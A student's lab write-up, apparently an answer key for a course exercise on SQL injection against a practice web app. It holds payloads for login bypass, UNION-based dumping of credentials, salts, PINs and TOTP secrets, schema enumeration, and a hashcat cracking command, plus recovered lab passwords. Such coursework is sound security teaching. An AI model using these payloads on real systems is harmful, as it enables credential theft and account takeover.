# KBE-Injections
Second lab of Communication Security course


# Answers
Here are the answers for this lab.

## Exercise 1
Login without password
```
' OR 1=1 #
```

## Exercise 2
I have used Selenium + LIKE operator to find the result in 40 iterations.
```
PIN of 'sinelser' is 3043 
```


## Exercise 3
To steal the secret was enough to use
```
badName' UNION SELECT secret AS username FROM users WHERE username LIKE 'sinelser' #
```

and I've got 
```
AWQJITSIA5MZXDBK   (secret)
```

Then I've generated OTP using Google Authenticator. 

## Exercise 4
To obtain a list of usernames, passwords, salts, secrets and pins I have used
 
```
offset=10 UNION SELECT CONCAT("  USERNAME IS ", username, "  PASSWORD IS  ", password, "  SALT IS  ", salt, "   PIN IS", pin, "  SECRET IS  ", secret) AS date_time, '' AS message FROM users
```

## Exercise 5
To obtain my password I've used BruteForce
```
Password for `sinelser` is ded93
```


## Exercise 6
To obtain teacher's password I've used prepared script to get a lot of popular passwords
The result file is 587 Mb. Then I have decided to use hashcat to go through all the combinations in that file.
Then I wrote method to add salt to each word and eventually run:
 
```
hashcat -a 0 -m 110 hashes.txt passwordsWithSalt.txt
```

Where `hashes.txt` has only hash of teacher's password and `passwordsWithSalt.txt` has a lot of passwords with put salt.

Password is
```
fm9fytmf7q
```

## Exercise 7
 Because password doesn't have any symbols like $_&#@(. Also it doesn't have Upper letters.

## Exercise 8
I've written 2 Injections:
1. Prints all column names
```
offset=10 UNION SELECT column_name AS message, '' AS date_time FROM information_schema.columns 
```
2. Prints all tables name
```
offset=10 UNION SELECT table_name AS message, '' AS date_time FROM information_schema.tables
```

## Exercise 9
 
```
Imposibile
```

